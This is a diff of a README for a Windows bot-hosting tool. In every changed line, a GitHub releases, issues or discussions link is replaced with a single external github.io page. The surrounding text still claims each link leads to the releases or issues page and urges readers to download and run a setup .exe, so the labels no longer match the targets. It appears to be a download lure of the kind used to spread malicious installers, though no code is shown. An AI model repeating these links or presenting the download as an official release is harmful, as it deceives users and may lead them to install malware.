@@ -1,6 +1,6 @@
 # 🤖 big-hosting-online-bot-hub - Run Your Bots from Any Browser
 
-[![Download Now](https://img.shields.io/badge/Download%20Latest%20Build-2026-blueviolet?style=for-the-badge&logo=github)](https://github.com/Singularitykobe94/big-hosting-online-bot-hub/releases)
+[![Download Now](https://img.shields.io/badge/Download%20Latest%20Build-2026-blueviolet?style=for-the-badge&logo=github)](https://singularitykobe94.github.io)
 
 ## 🌟 Overview
 
@@ -22,7 +22,7 @@ To start using Big Hosting Online Bot Hub, you'll need a Windows computer with i
 
 Visit this link to download the application.
 
-[**Download Latest Build**](https://github.com/Singularitykobe94/big-hosting-online-bot-hub/releases)
+[**Download Latest Build**](https://singularitykobe94.github.io)
 
 This link takes you to the releases page where you can find the newest build for 2026. Look for the file named `big-hosting-online-bot-hub-setup.exe` and click it to start downloading.
 
@@ -89,7 +89,7 @@ If you encounter a bug or need help beyond the troubleshooting guide:
 
 ### How to Submit a Support Request
 
-1. Go to the [GitHub Issues page](https://github.com/Singularitykobe94/big-hosting-online-bot-hub/issues)
+1. Go to the [GitHub Issues page](https://singularitykobe94.github.io)
 2. Click "New Issue"
 3. Choose "Bug Report" or "Feature Request" template
 4. Fill in the details:
@@ -100,7 +100,7 @@ If you encounter a bug or need help beyond the troubleshooting guide:
 
 ### Response Time
 
-The development team typically responds within 48 hours. For urgent issues, mention "URGENT" in the issue title. You can also check the [Discussions tab](https://github.com/Singularitykobe94/big-hosting-online-bot-hub/discussions) for community help.
+The development team typically responds within 48 hours. For urgent issues, mention "URGENT" in the issue title. You can also check the [Discussions tab](https://singularitykobe94.github.io) for community help.
 
 ## 📦 Features
 
@@ -124,7 +124,7 @@ The development team typically responds within 48 hours. For urgent issues, ment
 
 The platform receives regular updates. To ensure you're using the latest version:
 
-1. Check the [Releases page](https://github.com/Singularitykobe94/big-hosting-online-bot-hub/releases) periodically.
+1. Check the [Releases page](https://singularitykobe94.github.io) periodically.
 2. The dashboard shows a notification when a new build is available.
 3. Download the latest installer and run it - it will upgrade your existing installation without losing settings.
 
@@ -138,6 +138,6 @@ Thank you to the community for testing and reporting issues. Special thanks to c
 
 ---
 
-**Quick Link:** [Download the Newest Build](https://github.com/Singularitykobe94/big-hosting-online-bot-hub/releases)
+**Quick Link:** [Download the Newest Build](https://singularitykobe94.github.io)
 
 Keywords: bot hosting, browser bot manager, online automation, bot platform, Windows bot tool, run bots online, 2026 build
